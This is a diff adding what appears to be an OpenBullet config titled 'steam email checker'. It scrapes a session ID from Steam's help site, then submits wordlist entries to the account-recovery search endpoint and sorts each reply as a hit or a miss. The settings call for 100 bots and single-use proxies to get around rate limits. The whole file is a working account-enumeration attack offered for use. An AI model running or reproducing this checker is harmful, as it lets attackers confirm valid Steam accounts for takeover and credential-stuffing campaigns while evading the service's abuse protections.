@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "steam email checker",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-14T16:32:14.1323012+00:00",
+  "AdditionalInfo": "",
+  "Author": "Akonana",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://help.steampowered.com/en/wizard/HelpWithLoginInfo" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "var g_sessionID = \"" "\";" -> VAR "ID" 
+
+REQUEST POST "https://help.steampowered.com/en/wizard/AjaxLoginInfoSearch?reset=0&lost=0&issueid=406&searches=1&search=<USER>&captchagid=&captcha_text=&sessionid=<ID>&wizard_ajax=1" 
+  CONTENT "reset=0&lost=0&issueid=406&searches=1&search=<USER>&captchagid=&captcha_text=false&sessionid=<ID>&wizard_ajax=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: help.steampowered.com" 
+  HEADER "Referer: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/?issueid=406" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "You have exceeded the number of allowed recovery attempts" 
+    KEY "we were unable to find an email address that matched your search" 
+  KEYCHAIN Success OR 
+    KEY "{\"hash\":\"wizard\/HelpWithLoginInfoSendCode\/?" 
+
